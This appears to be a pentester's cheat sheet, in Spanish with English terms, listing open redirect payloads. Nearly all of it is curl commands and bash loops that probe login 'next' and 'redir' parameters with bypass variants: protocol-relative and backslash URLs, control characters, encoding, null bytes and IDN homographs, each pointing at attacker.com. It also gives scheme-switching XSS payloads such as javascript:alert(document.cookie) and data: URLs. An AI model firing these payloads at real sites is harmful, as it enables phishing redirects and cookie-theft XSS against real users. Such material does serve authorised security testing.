---
aliases:
  - Open Redirect Basic Payloads
  - Protocol-Relative Redirect
  - Scheme Switching
tags:
  - vuln/open-redirect
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Open Redirect]]"
---
# Open Redirect - Vectores Básicos

***

## URL Absoluta Completa

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=https://attacker.com" \| grep -i location` | 302 Location: https://attacker.com | Validator inexistente. |
| `curl -sI "https://target/login?next=http://attacker.com"` | Test HTTP scheme acceptance | Target que solo allowlistea HTTPS. |
| `curl -sI "https://target/login?next=https://attacker.com/path?p=1#frag"` | Path + query + fragment preservados | Custom landing post-redirect. |
| `curl -sI "https://target/login?next=https://attacker.com:8080"` | Custom port en redirect | Validator no chequea port. |
| `curl -sI "https://target/login?next=https://user:pass@attacker.com"` | Userinfo en URL | Browser warn pero parser permissivo. |
| `curl -sI "https://target/login?next=https://а‌ttacker.com"` (Cyrillic) | IDN homograph spoofing | Validator ASCII-only check. |
| `curl -sI "https://target/login?next=https://xn--ttacker-..."` | Punycode encoded IDN | Pre-decoded IDN match. |
| `for p in 'https://attacker.com' 'http://attacker.com' '//attacker.com' '\\\\attacker.com'; do curl -sI "https://target/login?next=$(jq -sRr @uri <<<$p)" \| grep -i location; done` | Bulk probe variants | Discovery. |
^or-vector-absolute

### Probes con curl

```bash
for p in 'https://attacker.com' 'http://attacker.com' '//attacker.com' '\\\\attacker.com' \
         'https://attacker.com/' 'https://attacker.com/path?p=1' 'https://attacker.com:8080' \
         'https://user:pass@attacker.com' 'https://attacker.com\@target.com' \
         'https://attacker.com%00.target.com'; do
  ENC=$(printf '%s' "$p" | jq -sRr @uri)
  echo "=== $p ==="
  curl -sI "https://target/login?next=$ENC" | grep -i location
done
```

___

## Protocol-Relative URLs

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=//attacker.com"` | Browser usa scheme actual (http/https) | Bypass más común — validator solo chequea `https://`. |
| `curl -sI "https://target/login?next=//attacker.com/legit-path"` | Domain malicioso con path legítimo | Spoof intent. |
| `curl -sI "https://target/login?next=\\\\attacker.com"` | Backslash protocol-relative (Windows-style) | Chrome lo trata como `//`. |
| `curl -sI "https://target/login?next=\/\/attacker.com"` | Escaped slashes | Validator no maneja. |
| `curl -sI "https://target/login?next=////attacker.com"` | Multiple slashes — browser normaliza | Edge case parser. |
| `curl -sI "https://target/login?next=/\attacker.com"` | Slash + backslash | Parser confusion. |
| `curl -sI "https://target/login?next=///attacker.com"` | Triple slash | Browser-specific normalization. |
| `curl -sI "https://target/login?next=//attacker.com%20foo"` (whitespace) | Whitespace handling | Validator strip varies. |
^or-vector-protocol-relative

### Browser parsing differences (referencia)

| Browser | `//evil.com` | `\\evil.com` | `\/\/evil.com` |
|---|---|---|---|
| Chrome | Redirects | Redirects | Redirects |
| Firefox | Redirects | Treats as path | Redirects |
| Safari | Redirects | Treats as path | Redirects |

___

## Scheme Switching

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/redir?url=javascript:alert(document.cookie)"` | XSS via redirect | App pasa value a `Location:` directo. |
| `curl -sI "https://target/redir?url=JaVaScRiPt:alert(1)"` | Mixed case bypass | Filter case-sensitive. |
| `curl -sI "https://target/redir?url=javas%09cript:alert(1)"` (URL-encoded tab) | Tab prefix bypass | Parser strip control chars. |
| `curl -sI "https://target/redir?url=%20javascript:alert(1)"` (space prefix) | Whitespace bypass | Browser tolera leading whitespace. |
| `curl -sI "https://target/redir?url=javascript&#58;alert(1)"` (HTML entity colon) | HTML entity bypass | Reflejado en HTML body redirect. |
| `curl -sI "https://target/redir?url=data:text/html,<script>alert(1)</script>"` | data: URL XSS | Algunas apps permiten data:. |
| `curl -sI "https://target/redir?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="` | Base64 data URL | Filter naive sobre `<script>`. |
| `curl -sI "https://target/redir?url=vbscript:msgbox(1)"` | IE legacy scheme | Old browsers. |
| `curl -sI "https://target/redir?url=intent://attacker#Intent;..."` | Android intent launch | Mobile redirect. |
| `for s in javascript JaVaScRiPt 'java%09script' 'java%0Ascript' 'java\tscript' data file vbscript livescript; do curl -sI "https://target/redir?url=${s}:alert(1)" \| grep -i location; done` | Bulk scheme probe | Discovery. |
^or-vector-scheme

___

## Backslash / Control Char Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=\\\\attacker.com"` | Backslash protocol-relative | Chrome trata como `//`. |
| `curl -sI "https://target/login?next=https:\\\\attacker.com"` | Backslash en lugar de `//` | Parser tolerante. |
| `curl -sI "https://target/login?next=https:/\attacker.com"` | Slash+backslash mix | Inconsistent parsing. |
| `curl -sI "https://target/login?next=https://target.com\@attacker.com"` | Backslash split antes de `@` | Parser ignora `\`. |
| `curl -sI "https://target/login?next=$(printf '\rhttps://attacker.com' \| jq -sRr @uri)"` | CR prefix | Control char bypass. |
| `curl -sI "https://target/login?next=$(printf '\thttps://attacker.com' \| jq -sRr @uri)"` | Tab prefix | Same idea. |
| `curl -sI "https://target/login?next=https%3A%2F%2Fattacker.com"` | URL-encoded full | Decode-after-validate. |
| `curl -sI "https://target/login?next=https:%2F%2Fattacker.com"` | Mixed encode | Partial decode. |
| `curl -sI "https://target/login?next=https:%5C%5Cattacker.com"` | URL-encoded backslash | Combo. |
| `curl -sI "https://target/login?next=https://target.com%00@attacker.com"` | Null byte truncation | Parser que trunca en null. |
^or-vector-control

***
